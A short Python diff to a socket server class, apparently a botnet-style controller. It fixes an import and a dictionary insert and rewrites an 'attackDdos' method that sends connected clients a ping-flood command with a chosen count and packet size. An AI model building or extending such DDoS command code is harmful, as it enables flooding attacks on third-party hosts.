@@ -1,5 +1,5 @@
 import socket
-from _dbus_bindings import Message
+#from _dbus_bindings import Message
 
 class Server:
 
@@ -21,7 +21,7 @@ class Server:
             # Wait for a connection
             connection, client_address = sock.accept()            
             try:
-                self.connections.insert(client_address, connection)
+                self.connections[client_address] =  connection
                 self.runSpecific(connection)                              
             finally:
                 # Clean up the connection
@@ -41,8 +41,8 @@ class ServerInput(Server):
     def setMessage(self, message):
         self.message = message
         
-    def attackDdos(self,canonicalName,packageWeight):
-        self.setMessage("ping "+ canonicalName + " -t -1 " + packageWeight)
+    def attackDdos(self,canonicalName,times, packageWeight):
+        self.setMessage("ping "+ canonicalName + " -n "+ str(times) + " -l " + str(packageWeight))
         self.run()
     
     def conectWithOneConnection(self,key,command):
